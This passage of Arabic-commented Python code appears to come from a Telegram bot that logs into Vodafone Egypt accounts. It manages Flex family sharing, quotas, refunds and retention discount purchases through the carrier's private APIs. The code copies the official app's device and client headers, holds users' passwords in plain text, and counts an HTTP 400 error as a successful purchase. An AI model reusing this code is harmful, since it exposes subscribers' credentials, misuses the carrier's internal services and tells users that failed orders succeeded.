    invitation_result = send_invitation(owner_token, owner_number, new_member_number, quota_percentage)
    
    if not invitation_result["success"]:
        return invitation_result
    
    time.sleep(15)
    
    # قبول الدعوة باستخدام الدالة الجديدة المبسطة
    accept_result = accept_invitation_only(new_member_number, new_member_password, owner_number)
    
    if accept_result["success"]:
        return {"success": True, "message": accept_result["message"], "details": {"owner": owner_number, "member": new_member_number}}
    else:
        return accept_result

def delete_family_invitation(number, password, member_number):
    """اسكربت حذف دعوة فودافون فليكس"""
    
    success, token, _, _ = login(number, password)
    if not success:
        return {"success": False, "message": f"❌ فشل تسجيل الدخول!", "details": {}}
    
    # حذف الدعوة
    delete_url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    
    delete_headers = {
        "Authorization": f"Bearer {token}",
        "msisdn": number,
        "Accept": "application/json",
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "Origin": "https://web.vodafone.com.eg",
        "Referer": "https://web.vodafone.com.eg/spa/familySharing",
        "clientId": "WebsiteConsumer"
    }
    
    delete_payload = {
        "name": "FlexFamily",
        "type": "FamilyRemoveMember",
        "category": [{"value": "47", "listHierarchyId": "TemplateID"}],
        "parts": {
            "member": [
                {"id": [{"value": number, "schemeName": "MSISDN"}], "type": "Owner"},
                {"id": [{"value": member_number, "schemeName": "MSISDN"}], "type": "Member"}
            ],
            "characteristicsValue": {
                "characteristicsValue": [
                    {"characteristicName": "Disconnect", "value": "0"},
                    {"characteristicName": "LastMemberDeletion", "value": "1"}
                ]
            }
        }
    }
    
    try:
        delete_response = requests.patch(
            delete_url, 
            headers=delete_headers, 
            json=delete_payload, 
            timeout=30
        )
        
        if delete_response.status_code in [200, 201, 204]:
            return {"success": True, "message": f"✅ تم حذف دعوة العضو {member_number} بنجاح!", "details": {"owner": number, "member": member_number}}
        else:
            return {"success": False, "message": f"❌ فشل حذف الدعوة! كود: {delete_response.status_code}", "details": {}}
            
    except Exception as e:
        return {"success": False, "message": f"❌ خطأ في الاتصال أثناء الحذف: {e}", "details": {}}

def change_quota_percentage(owner_number, owner_password, member_number, new_quota):
    """اسكربت تغيير نسبة الحصة في مجموعة فودافون فليكس"""
    
    success, token, _, _ = login(owner_number, owner_password)
    if not success:
        return {"success": False, "message": "❌ فشل تسجيل الدخول. تحقق من البيانات وحاول مرة أخرى.", "details": {}}
    
    def change_member_quota(token, owner_num, member_num, quota_percentage):
        """تغيير نسبة الحصة للعضو"""
        url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
        
        headers = {
            "Authorization": f"Bearer {token}",
            "msisdn": owner_num,
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
            "Origin": "https://web.vodafone.com.eg",
            "Referer": "https://web.vodafone.com.eg/spa/familySharing",
            "clientId": "WebsiteConsumer",
            "Host": "web.vodafone.com.eg",
            "Connection": "keep-alive",
            "Accept-Language": "ar-EG,ar;q=0.9",
            "Accept-Encoding": "gzip, deflate, br"
        }
        
        payload = {
            "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
            "parts": {
                "characteristicsValue": {
                    "characteristicsValue": [
                        {"characteristicName": "quotaDist1", "type": "percentage", "value": str(quota_percentage)}
                    ]
                },
                "member": [
                    {"id": [{"schemeName": "MSISDN", "value": owner_num}], "type": "Owner"},
                    {"id": [{"schemeName": "MSISDN", "value": member_num}], "type": "Member"}
                ]
            },
            "type": "QuotaRedistribution"
        }
        
        try:
            response = requests.patch(url, headers=headers, json=payload, timeout=30)
            
            if response.status_code in [200, 201, 204]:
                return {"success": True, "message": f"✅ تم تغيير حصة العضو {member_num} إلى {new_quota}% بنجاح!", "details": {"owner": owner_num, "member": member_num}}
            else:
                return {"success": False, "message": f"❌ فشل تغيير الحصة! كود: {response.status_code}", "details": {}}
                
        except Exception as e:
            return {"success": False, "message": f"❌ خطأ في الاتصال أثناء تغيير الحصة: {e}", "details": {}}
    
    # تغيير الحصة
    return change_member_quota(token, owner_number, member_number, new_quota)

# ===== دوال جديدة مأخوذة من ملف الرصيد المستحق =====
def get_all_in_one_data(phone_number, token):
    """الحصول على البيانات من AllInOne API"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pim/product"
    
    params = {
        'relatedParty.id': phone_number,
        '@type': "AllInOne",
        'relatedParty.name': "SubscriptionManagement"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "ProductInventoryManagementHost",
        'useCase': "AllInOne",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b26ba335813fad21",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2025.12.2",
        'x-agent-build': "1080",
        'msisdn': phone_number,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    
    try:
        response = requests.get(url, params=params, headers=headers, timeout=30)
        response.raise_for_status()
        data = response.json()
        
        if not data or len(data) == 0:
            return []
        
        if isinstance(data, list):
            return data
        elif isinstance(data, dict):
            return [data]
        else:
            return []
    except Exception as e:
        logger.error(f"خطأ في get_all_in_one_data: {e}")
        return []

def get_flex_profile_data(phone_number, token):
    """الحصول على البيانات من FlexProfile API"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pim/product"
    
    params = {
        'relatedParty.id': phone_number,
        '@type': "FlexProfile"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "ProductInventoryManagementHost",
        'useCase': "FlexProfile",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b26ba335813fad21",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2025.12.2",
        'x-agent-build': "1080",
        'msisdn': phone_number,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    
    try:
        response = requests.get(url, params=params, headers=headers, timeout=30)
        response.raise_for_status()
        data = response.json()
        
        if not data or len(data) == 0:
            return []
        
        if isinstance(data, list):
            return data
        elif isinstance(data, dict):
            return [data]
        else:
            return []
    except Exception as e:
        logger.error(f"خطأ في get_flex_profile_data: {e}")
        return []

# ===== دالة لتبسيط اسم الباقة (خاصة باقة فليكس فاميلي) =====
def simplify_package_name(name):
    """تحويل اسم الباقة إلى صيغة مختصرة مع الحفاظ على اسم فليكس 260 كما هو"""
    if name:
        # إذا كان الاسم يحتوي على 260 أو Flex_2021_523 نعرض "فليكس 260"
        if "260" in name or "Flex_2021_523" in name:
            return "فليكس 260"
        # إذا كان الاسم يحتوي على "ريح بالك" نعرض "ريح بالك ب 14 قرش"
        if "TARIFF_14_QURUSH" in name or "14 قرش" in name or "ريح بالك" in name:
            return "ريح بالك ب 14 قرش"
    return name

# ===== دالة استخراج معلومات الباقة (محدثة حسب الطلب) =====
def extract_bundle_info(all_data, flex_data):
    """استخراج معلومات الباقة من جميع المصادر (نسخة محسنة)"""
    bundle_info = {
        "package_name": "غير متاح",
        "package_price": 0,
        "found": False
    }
    
    # البحث في AllInOne
    for product in all_data:
        product_id = product.get('id', '')
        if ("Flex_" in product_id and "2021" in product_id) or "RX_Flex" in product_id:
            prices = product.get('productPrice', [])
            for price in prices:
                description = price.get('description', '')
                if description or not description:
                    bundle_info["package_name"] = description or product.get('productSpecification', {}).get('name', 'باقة فليكس')
                    if price.get('price', {}).get('taxIncludedAmount', {}).get('value'):
                        value_str = price['price']['taxIncludedAmount']['value']
                        try:
                            price_value = int(value_str) / 100
                            if "260" in bundle_info["package_name"]:
                                bundle_info["package_price"] = 260.00
                            elif "40" in bundle_info["package_name"]:
                                bundle_info["package_price"] = 40.00
                            elif "100" in bundle_info["package_name"]:
                                bundle_info["package_price"] = 100.00
                            else:
                                bundle_info["package_price"] = price_value
                        except:
                            bundle_info["package_price"] = 0
                    bundle_info["found"] = True
                    bundle_info["package_name"] = simplify_package_name(bundle_info["package_name"])
                    return bundle_info
    
    # البحث في FlexProfile
    for product in flex_data:
        product_id = product.get('id', '')
        if "RX_Flex" in product_id or "Flex_" in product_id:
            description = product.get('description', '')
            product_name = product.get('productSpecification', {}).get('name', '')
            bundle_info["package_name"] = description or product_name
            # محاولة استخراج السعر من productPrice
            prices = product.get('productPrice', [])
            for price in prices:
                if price.get('price', {}).get('taxIncludedAmount', {}).get('value'):
                    value_str = price['price']['taxIncludedAmount']['value']
                    try:
                        price_value = int(value_str) / 100
                        if "260" in bundle_info["package_name"]:
                            bundle_info["package_price"] = 260.00
                        elif "40" in bundle_info["package_name"]:
                            bundle_info["package_price"] = 40.00
                        elif "100" in bundle_info["package_name"]:
                            bundle_info["package_price"] = 100.00
                        else:
                            bundle_info["package_price"] = price_value
                    except:
                        bundle_info["package_price"] = 0
            bundle_info["found"] = True
            bundle_info["package_name"] = simplify_package_name(bundle_info["package_name"])
            return bundle_info
    
    return bundle_info

def extract_fees_info(all_data):
    """استخراج معلومات الرسوم"""
    services = {
        "ضريبة الدمغة": 0,
        "خدمة سلفني شكرا": 0,
        "خدمات شكرا": 0,
        "رسوم عروض الشحن": 0,
        "رسوم ACP": 0
    }
    
    if not all_data:
        return services
    
    for product in all_data:
        product_id = product.get('id', '')
        
        if ("Flex_" in product_id and "2021" in product_id) or "RX_Flex" in product_id or "Plus_" in product_id:
            continue
        
        prices = product.get('productPrice', [])
        price_value = 0
        
        if prices:
            for price in prices:
                if price.get('price', {}).get('taxIncludedAmount', {}).get('value'):
                    try:
                        price_value = int(price['price']['taxIncludedAmount']['value']) / 100
                        break
                    except:
                        continue
        
        if "StampTax" in product_id:
            services["ضريبة الدمغة"] = price_value
        elif "RxFees" in product_id or "Salefny" in product_id:
            services["خدمة سلفني شكرا"] = price_value
        elif "Shokran" in product_id:
            services["خدمات شكرا"] = price_value
        elif "RechargeFees" in product_id:
            services["رسوم عروض الشحن"] = price_value
        elif "ACP" in product_id:
            services["رسوم ACP"] = price_value
    
    return services

def calculate_total(bundle_price, services):
    """حساب الإجمالي - مع خدمة سلفني شكرا"""
    total_services = (
        services["ضريبة الدمغة"] + 
        services["خدمة سلفني شكرا"] + 
        services["خدمات شكرا"] + 
        services["رسوم عروض الشحن"] + 
        services["رسوم ACP"]
    )
    
    net_total = bundle_price + total_services
    expected_price = net_total * 1.428
    
    return {
        "صافي": round(net_total, 2),
        "المتوقع": round(expected_price, 1),
        "الرسوم": round(total_services, 2),
        "الباقة": round(bundle_price, 2)
    }

# ===== دالة جديدة لاستخراج الفليكسات من التقرير باستخدام الـ regex (حسب الطلب) =====
def extract_flex_remaining_from_report(report_data):
    """استخراج كمية الفليكسات المتبقية من بيانات التقرير باستخدام regex"""
    try:
        json_str = json.dumps(report_data)
        # البحث عن remainingValue مع units=FLEX
        pattern = r'"remainingValue":\s*{\s*"amount":\s*([0-9]+(?:\.[0-9]+)?)[^}]*"units":\s*"FLEX"'
        match = re.search(pattern, json_str)
        if match:
            return float(match.group(1))
        # البحث عن usageType=flex
        flex_pattern = r'"amount":\s*([0-9]+(?:\.[0-9]+)?)[^}]*"units":\s*"FLEX"[^}]*"usageType":\s*"flex"'
        match2 = re.search(flex_pattern, json_str)
        if match2:
            return float(match2.group(1))
        return None
    except Exception as e:
        logger.error(f"خطأ في استخراج الفليكسات: {e}")
        return None

def show_subscription_details(user_id, message_id, session):
    """عرض تفاصيل الاشتراكات مع إضافة النظام الحالي، الفليكسات الحالية، تاريخ تجديد الباقة، الرصيد الحالي، رصيد الموني باك"""
    try:
        number = session['number']
        password = session['password']
        
        bot.edit_message_text("⏳ جاري تسجيل الدخول...", user_id, message_id)
        
        token = get_fresh_token(number, password)
        if not token or token.startswith("ERROR:"):
            bot.edit_message_text("❌ فشل تسجيل الدخول. تحقق من البيانات.", user_id, message_id)
            return
        
        bot.edit_message_text("⏳ جاري تحميل بيانات الاشتراكات...", user_id, message_id)
        
        # الحصول على بيانات الباقة والرسوم
        all_data = get_all_in_one_data(number, token)
        flex_data = get_flex_profile_data(number, token)
        
        bundle_info = extract_bundle_info(all_data, flex_data)
        services_info = extract_fees_info(all_data)
        calculations = calculate_total(bundle_info["package_price"], services_info) if bundle_info["found"] else None
        
        # الحصول على تقرير الاستهلاك لاستخراج الرصيد والموني باك والفليكسات باستخدام الدالة الجديدة
        report_data = get_usage_report(number, token)
        if report_data:
            usage = extract_usage_data_simple(report_data)
            balance = usage.get('balance', 'غير متوفر')
            money_back = usage.get('moneyback', 'غير متوفر')
            # استخدام الدالة الجديدة للفليكسات
            flex_remaining = extract_flex_remaining_from_report(report_data)
            if flex_remaining is None:
                flex_remaining = 'غير متوفر'
            else:
                flex_remaining = str(flex_remaining)
        else:
            balance = session.get('balance', 'غير متوفر')
            money_back = 'غير متوفر'
            flex_remaining = 'غير متوفر'
        
        # الحصول على تاريخ تجديد الباقة والأيام المتبقية (إن وجدت)
        renewal_date, days_left = get_flex_renewal_info(number, token)
        
        result = f"""
📋 اشتراكاتي
━━━━━━━━━━━━━━━━━━━━

📱 رقم الخط: {number}

🔹 النظام الحالي:
   • {bundle_info['package_name'] if bundle_info['found'] else 'غير معروف'}
   • السعر: {bundle_info['package_price']:.0f} جنيه

🔹 الفليكسات الحالية:
   • {flex_remaining} فليكس

🔹 تاريخ تجديد الباقة:
   • {renewal_date if renewal_date else 'غير محدد'} (باقي {days_left if days_left is not None else 'غير معروف'} يوم)

🔹 الرصيد الحالي:
   • {balance} جنيه

🔹 رصيد الموني باك المتاح:
   • {money_back} جنيه

━━━━━━━━━━━━━━━━━━━━
🕐 تاريخ التقرير: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

تصلي على سيدنا محمد ﷺ
"""
        bot.edit_message_text(result, user_id, message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ حدث خطأ: {str(e)}", user_id, message_id)

# ===== دوال جديدة لاستخراج الفليكسات المتبقية وتاريخ التجديد (حسب الطلب) =====
def get_usage_report(number, token):
    """جلب تقرير الاستهلاك (يحتوي على الفليكسات)"""
    url = "https://mobile.vodafone.com.eg/services/dxl/usage/usageConsumptionReport"
    params = {
        "@type": "aggregated",
        "bucket.product.publicIdentifier": number
    }
    headers = {
        'User-Agent': "okhttp/4.9.3",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'api-host': "usageConsumptionHost",
        'useCase': "aggregated",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'msisdn': number,
        'Content-Type': "application/json",
    }
    try:
        r = requests.get(url, params=params, headers=headers, timeout=30)
        if r.status_code == 200:
            return r.json()
        else:
            return None
    except Exception as e:
        logger.error(f"خطأ في جلب التقرير: {e}")
        return None

def get_flex_remaining_new(number, token):
    """استخراج كمية الفليكسات المتبقية باستخدام regex (حسب الطلب)"""
    try:
        report = get_usage_report(number, token)
        if not report:
            return None
        return extract_flex_remaining_from_report(report)
    except Exception as e:
        logger.error(f"خطأ في استخراج الفليكسات: {e}")
        return None

def get_flex_renewal_info(number, token):
    """استخراج تاريخ تجديد الفليكس وحساب الأيام المتبقية"""
    try:
        report = get_usage_report(number, token)
        if not report:
            return None, None
        json_str = json.dumps(report)
        # البحث عن endDateTime داخل bucket يحتوي على FLEX
        dates = re.findall(r'"endDateTime":\s*"([^"]+)"', json_str)
        if dates:
            # نفترض أن التاريخ الأول هو تاريخ انتهاء الفليكس
            date_str = dates[0]
            if 'T' in date_str:
                date_only = date_str.split('T')[0]
            else:
                date_only = date_str
            # حساب الأيام المتبقية
            try:
                renewal = datetime.strptime(date_only, '%Y-%m-%d')
                today = datetime.now(egypt_tz).date()
                # ضبط التوقيت: نستخدم تاريخ اليوم بتوقيت القاهرة
                delta = (renewal - today).days
                if delta < 0:
                    delta = 0  # منتهية
                return date_only, delta
            except:
                return date_only, None
        return None, None
    except Exception as e:
        logger.error(f"خطأ في استخراج التاريخ: {e}")
        return None, None

# ===== دوال Money Back الجديدة (مع تعديل لعرض الباقات في أزرار) =====
def extract_amount_from_description(description):
    """استخراج المبلغ من وصف الباقة بشكل أكثر دقة"""
    try:
        patterns = [
            r'(\d+)\s*جنيها?',  # 10 جنيه أو 10 جنيها
            r'(\d+)\s*جنيه',    # 10 جنيه
            r'قيمة\s*(\d+)',     # قيمة 10
            r'(\d+)\s*رصيد',     # 10 رصيد
            r'باقة\s*(\d+)',     # باقة 10
            r'(\d+)\s*GB',       # 10 GB
            r'(\d+)\s*MB',       # 10 MB
            r'(\d+)\s*دقيقة',    # 10 دقيقة
            r'(\d+)'             # أي رقم
        ]
        
        for pattern in patterns:
            match = re.search(pattern, description, re.IGNORECASE)
            if match:
                return match.group(1)
        
        numbers = re.findall(r'\d+', description)
        if numbers:
            return numbers[0]
            
        return "غير محدد"
    except Exception as e:
        logger.error(f"Error extracting amount: {e}")
        return "غير محدد"

def get_refundable_offers(token, msisdn):
    """جلب الباقات القابلة للاسترجاع (Money Back) مع تحسين منطق الاسترداد"""
    try:
        end_ts = int(datetime.now().timestamp() * 1000)
        start_ts = int((datetime.now() - timedelta(days=20)).timestamp() * 1000)
        
        url = f"https://mobile.vodafone.com.eg/services/dxl/usagemng/usage?relatedParty.id={msisdn}&validFor.startDateTime={start_ts}&%40type=BalanceDetails&validFor.endDateTime={end_ts}"
        headers = {
            'User-Agent': "okhttp/4.11.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'api-host': "UsageManagementHost",
            'Authorization': f"Bearer {token}",
            'api-version': "v2",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Xiaomi 21061119AG",
            'x-agent-version': "2024.12.1",
            'x-agent-build': "946",
            'msisdn': msisdn,
            'Content-Type': "application/json",
            'Accept-Language': "ar"
        }
        
        response = requests.get(url, headers=headers, timeout=30)
        if response.status_code != 200:
            logger.error(f"Error fetching usage data: {response.status_code}")
            return []
        
        data = response.json()
        offers = []
        
        for item in data:
            item_type = item.get('type', '')
            description = item.get('description', '')
            
            if item_type == 'Adjustment' and any(word in description.lower() for word in ['فليكس', 'فلکس', 'فلێكس', 'flex', 'باقة', 'باکە', 'ماني', 'باك', 'خصم']):
                
                enc_product_id = None
                refundable = False
                date_str = item.get('date', '')
                amount = 0
                
                for ch in item.get('usageCharacteristic', []):
                    name = ch.get('name', '')
                    value = ch.get('value', '')
                    if name == 'EncProductID':
                        enc_product_id = value
                    elif name == 'RefundableFlag' and value == 'Y':
                        refundable = True
                
                if enc_product_id and refundable:
                    rated_usage = item.get('ratedProductUsage', [])
                    if rated_usage:
                        amount = abs(rated_usage[0].get('taxIncludedRatingAmount', 0))
                    
                    try:
                        dt = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%S")
                        date_formatted = dt.strftime("%Y-%m-%d %I:%M %p")
                    except:
                        date_formatted = date_str
                    
                    if amount == 0:
                        amount_str = extract_amount_from_description(description)
                        try:
                            amount = float(amount_str) if amount_str != "غير محدد" else 0
                        except:
                            amount = 0
                    
                    offers.append({
                        'description': description,
                        'enc_product_id': enc_product_id,
                        'date': date_formatted,
                        'amount': amount,
                        'original_date': date_str,
                        'refundable': refundable
                    })
        return offers
        
    except Exception as e:
        logger.error(f"Get refundable offers error: {e}")
        return []

def execute_refund(enc_product_id, token, msisdn, channel_name="MobileApp"):
    """تنفيذ استرجاع الباقة (Money Back)"""
    try:
        url_refund = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
        payload = {
            "channel": {"name": channel_name},
            "orderItem": [{
                "action": "add",
                "product": {
                    "characteristic": [
                        {"name": "WorkflowName", "value": "SelfRefund"},
                        {"name": "EncProductID", "value": enc_product_id},
                        {"name": "ActionID", "value": "10"}
                    ],
                    "relatedParty": [{"id": msisdn, "name": "MSISDN", "role": "Subscriber"}]
                },
                "eCode": 0
            }],
            "@type": "MoneyBack"
        }
        
        headers = {
            'User-Agent': "okhttp/4.11.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'api-host': "ProductOrderingManagement",
            'useCase': "MONEYBACK",
            'Authorization': f"Bearer {token}",
            'api-version': "v2",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Xiaomi 21061119AG",
            'x-agent-version': "2024.12.1",
            'x-agent-build': "946",
            'msisdn': msisdn,
            'Accept-Language': "ar",
            'Content-Type': "application/json; charset=UTF-8"
        }
        
        response = requests.post(url_refund, json=payload, headers=headers, timeout=30)
        return response
        
    except Exception as e:
        logger.error(f"Execute refund error: {e}")
        return None

# ===== دالة تنفيذ الباقات العادية (تزويد يومين وباقات فليكس) - تم تعطيلها =====
def execute_package_conversion(number, password, package_id):
    """تنفيذ تحويل الباقة (تزويد يومين أو باقات فليكس) - معطلة حالياً"""
    return {"success": False, "message": "⚠️ هذه الخدمة معطلة حالياً."}

# ===== خدمة خصم جميع الأنظمة (Discount Offers) =====
DISCOUNT_USER_AGENT = "okhttp/4.12.0"
DISCOUNT_DEVICE_ID = "060372c24b51d07a"
DISCOUNT_DIGITAL_ID = "23ZYFNE2R7G1W"
DISCOUNT_DEVICE_MODEL = "Realme RMX3871"
DISCOUNT_APP_VERSION = "2025.10.3"
DISCOUNT_APP_BUILD = "1050"

def login_for_discount(phone_number: str, password: str) -> Optional[Dict[str, str]]:
    """تسجيل الدخول للحصول على رمز الوصول"""
    success, token, _, _ = login(phone_number, password)
    if success:
        return {
            'access_token': token,
            'phone_number': phone_number
        }
    return None

def get_flex_discount_offers(login_data: Dict[str, str]) -> Optional[Dict[str, Any]]:
    """الحصول على عروض الخصم المتاحة"""
    try:
        url = (f"https://mobile.vodafone.com.eg/services/dxl/epo/eligibleProductOffering"
               f"?customerAccountId={login_data['phone_number']}"
               f"&parts.customerAccount.type=Consumer"
               f"&Accept-Language=ar"
               f"&type=Tarrifs")
        
        headers = {
            'User-Agent': DISCOUNT_USER_AGENT,
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'api-host': "EligibleProductOfferingHost",
            'useCase': "Tarrifs",
            'Authorization': f"Bearer {login_data['access_token']}",
            'api-version': "v2",
            'device-id': DISCOUNT_DEVICE_ID,
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': DISCOUNT_DEVICE_MODEL,
            'x-agent-version': DISCOUNT_APP_VERSION,
            'x-agent-build': DISCOUNT_APP_BUILD,
            'msisdn': login_data['phone_number'],
            'Content-Type': "application/json",
            'Accept-Language': "ar"
        }
        
        response = requests.get(url, headers=headers, timeout=20)
        response.raise_for_status()
        return response.json()
        
    except Exception as e:
        logger.error(f"Error getting discount offers: {e}")
        return None

def _is_discount_offer(line_item: Dict[str, Any]) -> bool:
    """التحقق من أن العنصر هو عرض خصم"""
    description = str(line_item.get('desc', ''))
    offer_type = line_item.get('type', '')
    valid_types = ['Access fees Discount', 'Usage fees Discount']
    
    keywords = ['خليك', 'خصم', 'فليكس']
    has_keyword = any(keyword in description for keyword in keywords)
    
    return has_keyword and offer_type in valid_types

def _extract_offer_info(line_item: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    """استخراج معلومات العرض من عنصر الخط"""
    try:
        offer_name = line_item.get('name', '')
        offer_desc = line_item.get('desc', '')
        
        price_data = line_item.get('price', [])
        price = "0 جنيه"
        for price_item in price_data:
            if price_item.get('text') == 'OfferPrice' and 'priceValue' in price_item:
                price_value = price_item['priceValue']
                if 'discountPrice' in price_value:
                    discount_price = price_value['discountPrice']
                    if 'value' in discount_price:
                        price_val = discount_price['value']
                        if price_val:
                            price = f"{price_val} جنيه"
        
        product_id = None
        tariff_id = None
        offer_rank = None
        cohort_id = None
        
        char_data = line_item.get('characteristic', {})
        char_values = char_data.get('characteristicsValue', [])
        for char in char_values:
            char_name = char.get('characteristicName')
            char_value = char.get('value')
            
            if char_name == 'TibcoID':
                product_id = char_value
            elif char_name == 'TariffID':
                tariff_id = char_value
            elif char_name == 'OfferRank':
                offer_rank = char_value
            elif char_name == 'CohortId':
                cohort_id = char_value
        
        tariff_rank = None
        categories = line_item.get('category', [])
        for category in categories:
            if category.get('listHierarchyId') == 'TariffRank':
                tariff_rank = category.get('value')
                break
        
        if not product_id or not tariff_id:
            return None
        
        clean_desc = offer_desc
        if '،' in str(offer_desc):
            clean_desc = str(offer_desc).split('،')[0].strip()
        
        return {
            'name': offer_name,
            'desc': offer_desc,
            'clean_desc': clean_desc,
            'type': line_item.get('type', ''),
            'price': price,
            'tariff_rank': tariff_rank,
            'product_id': product_id,
            'tariff_id': tariff_id,
            'offer_rank': offer_rank,
            'cohort_id': cohort_id
        }
        
    except Exception:
        return None

def extract_all_discount_offers(offers_data: Optional[Dict[str, Any]]) -> list[Dict[str, Any]]:
    """استخراج جميع عروض الخصم من بيانات الاستجابة"""
    if not offers_data:
        return []
    
    offers_list = []
    seen_offer_keys = set()
    
    for offer_group in offers_data:
        if 'parts' in offer_group and 'productOffering' in offer_group['parts']:
            product_offerings = offer_group['parts']['productOffering']
            
            for product_offering in product_offerings:
                line_items = product_offering.get('lineItem', [])
                for line_item in line_items:
                    if not _is_discount_offer(line_item):
                        continue
                    
                    offer_info = _extract_offer_info(line_item)
                    if not offer_info:
                        continue
                    
                    offer_key = f"{offer_info['name']}_{offer_info['price']}"
                    if offer_key in seen_offer_keys:
                        continue
                    
                    seen_offer_keys.add(offer_key)
                    offers_list.append(offer_info)
    
    return offers_list

def purchase_discount_offer(login_data: Dict[str, str], selected_offer: Dict[str, Any]) -> bool:
    """شراء عرض الخصم المحدد"""
    try:
        url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
        
        price_str = selected_offer.get('price', '0')
        price_match = re.search(r'(\d+\.?\d*)', price_str)
        price_value = price_match.group(1) if price_match else "0.0"
        
        payload = {
            "channel": {"name": "MobileApp"},
            "orderItem": [{
                "action": "add",
                "id": selected_offer['product_id'],
                "itemPrice": [
                    {
                        "name": "OriginalPrice",
                        "price": {
                            "taxIncludedAmount": {
                                "unit": "LE",
                                "value": price_value
                            }
                        }
                    },
                    {
                        "name": "MigrationFees",
                        "price": {
                            "taxIncludedAmount": {
                                "unit": "LE",
                                "value": "0.0"
                            }
                        }
                    }
                ],
                "product": {
                    "characteristic": [
                        {"name": "TariffRank", "value": selected_offer['tariff_rank']},
                        {"name": "TariffID", "value": selected_offer['tariff_id']},
                        {"name": "Quota"},
                        {"name": "Validity", "@type": "MONTH", "value": "1"},
                        {"name": "MaxAdjustmentNumber", "value": "1"},
                        {"name": "offerRank", "value": selected_offer['offer_rank']},
                        {"name": "MigrationDesc", "value": "Intervention Offer Migration"},
                        {"name": "CohortId", "value": selected_offer['cohort_id']}
                    ],
                    "productSpecification": [
                        {"id": "Retention With Offer", "name": "Category"},
                        {"id": "Upon Renewal / Repurchase", "name": "MigrationRule"},
                        {"id": "0", "name": "RatePlanType"},
                        {"id": "Flex Family", "name": "BundleType"}
                    ],
                    "relatedParty": [
                        {
                            "id": login_data['phone_number'],
                            "name": "MSISDN",
                            "@referredType": "prepaid",
                            "role": "Subscriber"
                        },
                        {
                            "id": selected_offer['tariff_id'],
                            "name": "TariffID",
                            "@referredType": "prepaid",
                            "role": "TariffID"
                        }
                    ]
                },
                "@type": selected_offer.get('type', 'Access fees Discount'),
                "eCode": 0
            }],
            "@type": "InterventionTariff"
        }
        
        headers = {
            'User-Agent': DISCOUNT_USER_AGENT,
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8",
            'api-host': "ProductOrderingManagement",
            'useCase': "InterventionTariff",
            'Authorization': f"Bearer {login_data['access_token']}",
            'api-version': "v2",
            'device-id': DISCOUNT_DEVICE_ID,
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': DISCOUNT_DEVICE_MODEL,
            'x-agent-version': DISCOUNT_APP_VERSION,
            'x-agent-build': DISCOUNT_APP_BUILD,
            'msisdn': login_data['phone_number'],
            'Accept-Language': "ar"
        }
        
        response = requests.post(
            url, 
            data=json.dumps(payload, ensure_ascii=False), 
            headers=headers, 
            timeout=20
        )
        
        if response.status_code == 400:
            return True
        
        try:
            response_json = response.json()
            if 'code' in response_json:
                code = response_json['code']
                success_codes = ["1008", "1001", "1002"]
                if code in success_codes:
                    return True
        except:
            pass
        
        if response.status_code in [200, 201]:
            return True
        
        return False
        
    except Exception as e:
        logger.error(f"Error purchasing discount offer: {e}")
        return False

def get_all_discount_offers(number, password):
    """دالة رئيسية لجلب عروض الخصم"""
    try:
        login_data = login_for_discount(number, password)
        if not login_data:
            return None, "❌ فشل تسجيل الدخول. تحقق من البيانات وحاول مرة أخرى."
        
        offers_data = get_flex_discount_offers(login_data)
        if not offers_data:
            return None, "❌ لا توجد عروض خصم متاحة حالياً."
        
        offers_list = extract_all_discount_offers(offers_data)
        if not offers_list:
            return None, "❌ لا توجد عروض خصم متاحة حالياً."
        
        return offers_list, login_data
        
    except Exception as e:
        return None, f"❌ خطأ في جلب العروض: {str(e)}"

def apply_discount_offer(number, password, offer_index):
    """تطبيق عرض الخصم المحدد"""
    try:
        login_data = login_for_discount(number, password)
        if not login_data:
